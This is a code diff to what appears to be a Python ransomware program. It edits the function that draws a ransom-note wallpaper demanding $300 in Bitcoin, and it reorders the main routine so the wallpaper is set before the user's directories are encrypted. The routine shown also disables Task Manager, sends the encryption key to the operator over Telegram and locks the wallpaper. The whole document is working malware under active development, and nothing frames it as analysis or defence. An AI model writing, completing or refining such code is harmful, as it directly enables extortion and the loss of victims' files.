@@ -102,11 +102,13 @@ def create_ransom_background(system_id):
     width, height = 1920, 1080
     image = Image.new("RGB", (width, height), "black")
     draw = ImageDraw.Draw(image)
+
     try:
         font_path = "C:/Windows/Fonts/arial.ttf"
         font = ImageFont.truetype(font_path, 50)
     except:
         font = ImageFont.load_default()
+
     ransom_message = f"""
     [!] YOUR FILES HAVE BEEN ENCRYPTED
     Send $300 in BTC to the following address:
@@ -114,7 +116,9 @@ def create_ransom_background(system_id):
     Contact our support on Telegram to receive the decryption key.
     System ID: {system_id}
     """
+
     draw.text((200, 300), ransom_message, fill="red", font=font)
+    
     ransom_image_path = os.path.join(os.environ["TEMP"], "ransom_background.jpg")
     image.save(ransom_image_path)
     return ransom_image_path
@@ -146,9 +150,9 @@ if __name__ == '__main__':
     disable_task_manager()
     system_id = generate_system_id()
     send_telegram_message(f"‼️ Ransomware executed.\n ℹ️ System ID: {system_id}\n ℹ️ Key: {encryption_key.decode()}")
+    set_ransom_background(system_id)
     directories = get_user_directories()
     for directory in directories:
         if os.path.exists(directory):
             encrypt_directory(directory, encryption_key)
-    set_ransom_background(system_id)
     disable_wallpaper_change()
